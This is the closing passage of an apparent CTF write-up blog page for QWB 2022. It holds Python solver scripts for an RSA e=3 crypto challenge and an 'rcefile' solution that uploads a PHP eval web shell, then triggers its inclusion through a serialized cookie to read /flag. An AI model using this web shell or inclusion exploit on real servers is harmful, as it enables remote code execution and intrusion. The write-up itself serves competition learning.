</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Start to find all the </span><span style="color:#e6db74">{:#x}</span><span style="color:#e6db74">th root of </span><span style="color:#e6db74">{}</span><span style="color:#e6db74"> modulo </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">.&#34;</span><span style="color:#f92672">.</span>format(e, cp, p))
</span></span><span style="display:flex;"><span>    start <span style="color:#f92672">=</span> time<span style="color:#f92672">.</span>time()
</span></span><span style="display:flex;"><span>    all_mp <span style="color:#f92672">=</span> set()
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> root <span style="color:#f92672">in</span> proot:
</span></span><span style="display:flex;"><span>        mp2 <span style="color:#f92672">=</span> mp <span style="color:#f92672">*</span> root <span style="color:#f92672">%</span> p
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">assert</span>(pow(mp2, e, p) <span style="color:#f92672">==</span> cp)
</span></span><span style="display:flex;"><span>        all_mp<span style="color:#f92672">.</span>add(mp2)
</span></span><span style="display:flex;"><span>    end <span style="color:#f92672">=</span> time<span style="color:#f92672">.</span>time()
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Finished in </span><span style="color:#e6db74">{}</span><span style="color:#e6db74"> seconds.&#34;</span><span style="color:#f92672">.</span>format(end <span style="color:#f92672">-</span> start))
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> all_mp
</span></span><span style="display:flex;"><span>e<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span>
</span></span><span style="display:flex;"><span>p0 <span style="color:#f92672">=</span> <span style="color:#ae81ff">260594583349478633632570848336184053653</span>
</span></span><span style="display:flex;"><span>p1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">223213222467584072959434495118689164399</span>
</span></span><span style="display:flex;"><span>p2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">225933944608558304529179430753170813347</span>
</span></span><span style="display:flex;"><span>p3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">218566259296037866647273372633238739089</span>
</span></span><span style="display:flex;"><span>c <span style="color:#f92672">=</span> <span style="color:#ae81ff">945272793717722090962030960824180726576357481511799904903841312265308706852971155205003971821843069272938250385935597609059700446530436381124650731751982419593070224310399320617914955227288662661442416421725698368791013785074809691867988444306279231013360024747585261790352627234450209996422862329513284149</span>
</span></span><span style="display:flex;"><span>c0<span style="color:#f92672">=</span>c<span style="color:#f92672">%</span>p0
</span></span><span style="display:flex;"><span>c1<span style="color:#f92672">=</span>c<span style="color:#f92672">%</span>p1
</span></span><span style="display:flex;"><span>c2<span style="color:#f92672">=</span>c<span style="color:#f92672">%</span>p2
</span></span><span style="display:flex;"><span>c3<span style="color:#f92672">=</span>c<span style="color:#f92672">%</span>p3
</span></span><span style="display:flex;"><span>pl <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>ql <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>m2 <span style="color:#f92672">=</span> int(AMM(c2, e, p2))
</span></span><span style="display:flex;"><span>m3 <span style="color:#f92672">=</span> int(AMM(c3, e, p3))
</span></span><span style="display:flex;"><span>proot2<span style="color:#f92672">=</span>findAllPRoot(p2,e)
</span></span><span style="display:flex;"><span>proot3<span style="color:#f92672">=</span>findAllPRoot(p3,e)
</span></span><span style="display:flex;"><span>pl <span style="color:#f92672">=</span> findAllSolutions(m2, proot2, c2, p2)
</span></span><span style="display:flex;"><span>ql <span style="color:#f92672">=</span> findAllSolutions(m3, proot3, c3, p3)
</span></span><span style="display:flex;"><span>print(pl)
</span></span><span style="display:flex;"><span>print(ql)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">=</span>list(pl)
</span></span><span style="display:flex;"><span>ql<span style="color:#f92672">=</span>list(ql)
</span></span><span style="display:flex;"><span>d0<span style="color:#f92672">=</span><span style="color:#ae81ff">173729722232985755755047232224122702435</span>
</span></span><span style="display:flex;"><span>d1<span style="color:#f92672">=</span><span style="color:#ae81ff">148808814978389381972956330079126109599</span>
</span></span><span style="display:flex;"><span>m0<span style="color:#f92672">=</span>int(pow(c0,d0,p0))
</span></span><span style="display:flex;"><span>m1<span style="color:#f92672">=</span>int(pow(c1,d1,p1))
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(e):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(e):
</span></span><span style="display:flex;"><span>        m <span style="color:#f92672">=</span> crt([int(pl[i]), int(ql[j]),m0,m1], [p2, p3,p0,p1])
</span></span><span style="display:flex;"><span>        print(m)
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> libnum <span style="color:#f92672">import</span> n2s
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> gmpy2
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p0 <span style="color:#f92672">=</span> <span style="color:#ae81ff">260594583349478633632570848336184053653</span>
</span></span><span style="display:flex;"><span>p1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">223213222467584072959434495118689164399</span>
</span></span><span style="display:flex;"><span>p2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">225933944608558304529179430753170813347</span>
</span></span><span style="display:flex;"><span>p3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">218566259296037866647273372633238739089</span>
</span></span><span style="display:flex;"><span>n <span style="color:#f92672">=</span> <span style="color:#ae81ff">8250871280281573979365095715711359115372504458973444367083195431861307534563246537364248104106494598081988216584432003199198805753721448450911308558041115465900179230798939615583517756265557814710419157462721793864532239042758808298575522666358352726060578194045804198551989679722201244547561044646931280001</span>
</span></span><span style="display:flex;"><span>e <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>
</span></span><span style="display:flex;"><span>c <span style="color:#f92672">=</span> <span style="color:#ae81ff">945272793717722090962030960824180726576357481511799904903841312265308706852971155205003971821843069272938250385935597609059700446530436381124650731751982419593070224310399320617914955227288662661442416421725698368791013785074809691867988444306279231013360024747585261790352627234450209996422862329513284149</span>
</span></span><span style="display:flex;"><span>print((p0 <span style="color:#f92672">*</span> p1 <span style="color:#f92672">*</span> p2 <span style="color:#f92672">*</span> p3) <span style="color:#f92672">**</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">==</span> n)
</span></span><span style="display:flex;"><span>phi <span style="color:#f92672">=</span> p0 <span style="color:#f92672">*</span> (p0 <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">*</span> (p1 <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">*</span> p1 <span style="color:#f92672">*</span> (p2 <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">*</span> p2 <span style="color:#f92672">*</span> p3 <span style="color:#f92672">*</span> (p3 <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>pr <span style="color:#f92672">=</span> (p0 <span style="color:#f92672">*</span> p1 <span style="color:#f92672">*</span> p2 <span style="color:#f92672">*</span> p3)
</span></span><span style="display:flex;"><span>print((p3 <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">%</span> <span style="color:#ae81ff">27</span>)
</span></span><span style="display:flex;"><span>fl <span style="color:#f92672">=</span> [
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">1529007847379796407634756887525822026696243818376722108701969132742428428165312563623502055174162111318912346740690335148179223775392999980945766987459837</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">1475292321022733362914538619161388693005464952363739416469049560011153697847764341022230542196966303658527328460810763143999529259177792246387209275640333</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">1306173663174680354544083835098873046665147955161485267105809626183470299213147062484361435517127425037465762176491160436617371316470553010760895171531168</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">153759683776433243399305434624208622981670871584305881184763149503345166185487917443890373624829793380160217617791063750644305153019838041206592966473567</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">100044157419370198679087166259775289290892005571323188951843576772070435867939694842618860647633985719775199337911491746464610636804630306648035254654063</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">2803358489265171472227210840490862843537881207776943757296126230937523911331160681955579712312498104881693839057868862438866912819678753688485739816184899</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">222834185454100348265422735477774595442565074276484202923325623851990342933869396693076942784741899922511481742674099962888282201740191862829636553138531</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">169118659097037303545204467113341261751786208263501510690406051120715612616321174091805429807546092262126463462794527958708587685524984128271078841319027</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">1248984295174749683050825615411469211061247361327166117293032213981703895553936323127707213641064897178474925251326429742817744892644764737209862</span>]
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> fl:
</span></span><span style="display:flex;"><span>    le <span style="color:#f92672">=</span> (c <span style="color:#f92672">-</span> i <span style="color:#f92672">**</span> <span style="color:#ae81ff">3</span>) <span style="color:#f92672">%</span> n
</span></span><span style="display:flex;"><span>    le <span style="color:#f92672">=</span> le <span style="color:#f92672">*</span> gmpy2<span style="color:#f92672">.</span>invert(<span style="color:#ae81ff">3</span> <span style="color:#f92672">*</span> (i <span style="color:#f92672">**</span> <span style="color:#ae81ff">2</span>), n)
</span></span><span style="display:flex;"><span>    x <span style="color:#f92672">=</span> le <span style="color:#f92672">//</span> pr
</span></span><span style="display:flex;"><span>    i <span style="color:#f92672">=</span> i <span style="color:#f92672">+</span> x <span style="color:#f92672">*</span> pr
</span></span><span style="display:flex;"><span>    print(pow(i, e, n) <span style="color:#f92672">==</span> c)
</span></span><span style="display:flex;"><span>    print(n2s(int(i)))
</span></span></code></pre></div><h3 id="rcefile">rcefile</h3>
<p>存在 spl_autoload 函数，上传文件 <code>test.inc</code>：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">eval</span>($_GET[<span style="color:#e6db74">&#39;cmd&#39;</span>]);
</span></span></code></pre></div><p>记下返回的文件名 <code>d6e2555175cf7f64910cbfce15842643.inc</code> 后自动包含</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">GET</span> /showfile.php?cmd=system(&#39;cat+/flag&#39;)%3b <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">eci-2ze9ta9edjrrkrtfpism.cloudeci1.ichunqiu.com</span>
</span></span><span style="display:flex;"><span>User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0</span>
</span></span><span style="display:flex;"><span>Accept<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span>
</span></span><span style="display:flex;"><span>Accept-Language<span style="color:#f92672">:</span> <span style="color:#ae81ff">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span>
</span></span><span style="display:flex;"><span>Accept-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">gzip, deflate</span>
</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">close</span>
</span></span><span style="display:flex;"><span>Referer<span style="color:#f92672">:</span> <span style="color:#ae81ff">http://eci-2ze9ta9edjrrkrtfpism.cloudeci1.ichunqiu.com/</span>
</span></span><span style="display:flex;"><span>Cookie<span style="color:#f92672">:</span> <span style="color:#ae81ff">O%3a32%3a&#34;D6e2555175cf7f64910cbfce15842643&#34;%3a0%3a{}</span>
</span></span><span style="display:flex;"><span>Upgrade-Insecure-Requests<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
</span></span></code></pre></div>
</section>


    <footer class="article-footer">
    
    <section class="article-tags">
        
            <a href="/tags/writeup/">Writeup</a>
        
            <a href="/tags/qwb/">qwb</a>
        
    </section>


    </footer>


    
        <link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.css"integrity="sha384-RZU/ijkSsFbcmivfdRBQDtwuwVqK7GMOw6IMvKyeWL2K5UAlyp6WonmB8m7Jd0Hn"crossorigin="anonymous"
            ><script 
                src="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.js"integrity="sha384-pK1WpvzWVBQiP0/GjnvRxV4mOb0oxFuyRxJlk6vVw146n3egcN5C925NCP7a7BY8"crossorigin="anonymous"
                defer="true"
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/contrib/auto-render.min.js"integrity="sha384-vZTG03m&#43;2yp6N6BNi5iM4rW4oIwk5DfcNdFfxkk9ZWpDriOkXX8voJBFrAO7MpVl"crossorigin="anonymous"
                defer="true"
                >
            </script><script>
    window.addEventListener("DOMContentLoaded", () => {
        renderMathInElement(document.querySelector(`.article-content`), {
            delimiters: [
                { left: "$$", right: "$$", display: true },
                { left: "$", right: "$", display: false },
                { left: "\\(", right: "\\)", display: false },
                { left: "\\[", right: "\\]", display: true }
            ]
        });})
</script>
    
</article>

    <aside class="related-contents--wrapper">
    
    
        <h2 class="section-title">Related contents</h2>
        <div class="related-contents">
            <div class="flex article-list--tile">
                
                    
<article class="has-image">
    <a href="/post/ciscn-2022-north-writeup-by-or4nge/">
        
        
            <div class="article-image">
                <img src="/post/ciscn-2022-north-writeup-by-or4nge/cover.fdd1e3d117f12d7fcd887f75f2c6085f_hu64e9dce0f7c55970c8dfa2838c4ad483_501581_250x150_fill_box_smart1_3.png" 
                        width="250" 
                        height="150" 
                        loading="lazy" 
                        data-key="" 
                        data-hash="md5-/dHj0RfxLX/NiH918sYIXw==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">CISCN2022 华北分赛区 Writeup by or4nge</h2>
        </div>
    </a>
</article>
                
                    
<article class="has-image">
    <a href="/post/ciscn-2022-writeup-by-or4nge/">
        
        
            <div class="article-image">
                <img src="/post/ciscn-2022-writeup-by-or4nge/cover.dd9a1f3516fd809e1fd436da1fd62443_hua298b546d0b49e7ca84fa027f7c430e6_662553_250x150_fill_q75_box_smart1.jpg" 
                        width="250" 
                        height="150" 
                        loading="lazy" 
                        data-key="" 
                        data-hash="md5-3ZofNRb9gJ4f1DbaH9YkQw==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">CISCN2022 初赛 Writeup by or4nge</h2>
        </div>
    </a>
</article>
                
                    
<article class="has-image">
    <a href="/post/starctf2022-writeup-by-or4nge/">
        
        
            <div class="article-image">
                <img src="/post/starctf2022-writeup-by-or4nge/cover.5cd75ed8824fecadd0a744a29cff3c66_hu1b2e905ab849912933a39ffac9637886_354329_250x150_fill_box_smart1_3.png" 
                        width="250" 
                        height="150" 
                        loading="lazy" 
                        data-key="" 
                        data-hash="md5-XNde2IJP7K3Qp0SinP88Zg==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">starCTF2022 Writeup by or4nge</h2>
        </div>
    </a>
</article>
                
                    
<article class="">
    <a href="/post/hgame2022-writeup-by-or4nge/">
        
        

        <div class="article-details">
            <h2 class="article-title">HGAME2022 Writeup by or4nge</h2>
        </div>
    </a>
</article>
                
                    
<article class="has-image">
    <a href="/post/hws2022-writeup/">
        
        
            <div class="article-image">
                <img src="/post/hws2022-writeup/cover.f811fdb681235510573ab73e97dd00ae_hu31039705144761defd1e1848d4287a81_131160_250x150_fill_q75_box_smart1.jpg" 
                        width="250" 
                        height="150" 
                        loading="lazy" 
                        data-key="" 
                        data-hash="md5-&#43;BH9toEjVRBXOrc&#43;l90Arg==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">HWS2022冬令营预选赛 Writeup</h2>
        </div>
    </a>
</article>
                
            </div>
        </div>
    
</aside>

     
    
        
    

    <footer class="site-footer">
    <section class="copyright">
        &copy; 
        
        2023 or4nge
    </section>
    
    <section class="powerby">
        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.5.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
    </section>
</footer>


    
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer="true"
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer="true"
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
            >

            </main>
    
        <aside class="sidebar right-sidebar sticky">
            <section class="widget archives">
                <div class="widget-icon">
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <line x1="5" y1="9" x2="19" y2="9" />
  <line x1="5" y1="15" x2="19" y2="15" />
  <line x1="11" y1="4" x2="7" y2="20" />
  <line x1="17" y1="4" x2="13" y2="20" />
</svg>



                </div>
                <h2 class="widget-title section-title">Table of contents</h2>
                
                <div class="widget--toc">
                    <nav id="TableOfContents">
  <ul>
    <li><a href="#web">Web</a>
      <ul>
        <li><a href="#babyweb">babyweb</a></li>
        <li><a href="#easyweb">easyweb</a></li>
      </ul>
    </li>
    <li><a href="#reverse">Reverse</a>
      <ul>
        <li><a href="#find_basic">find_basic</a></li>
        <li><a href="#gamemaster">GameMaster</a></li>
        <li><a href="#easyapk">Easyapk</a></li>
        <li><a href="#deeprev">deeprev</a></li>
      </ul>
    </li>
    <li><a href="#crypto">Crypto</a>
      <ul>
        <li><a href="#myjwt">MyJWT</a></li>
        <li><a href="#factor">Factor</a></li>
      </ul>
    </li>
    <li><a href="#强网先锋">强网先锋</a>
      <ul>
        <li><a href="#polydiv">Polydiv</a></li>
        <li><a href="#asr">ASR</a></li>
        <li><a href="#rcefile">rcefile</a></li>
      </ul>
    </li>
  </ul>
</nav>
                </div>
            </section>
        </aside>
    

        </div>
        <script 
                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
                defer="false"
                >
            </script><script type="text/javascript" src="/ts/main.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>

    </body>
</html>
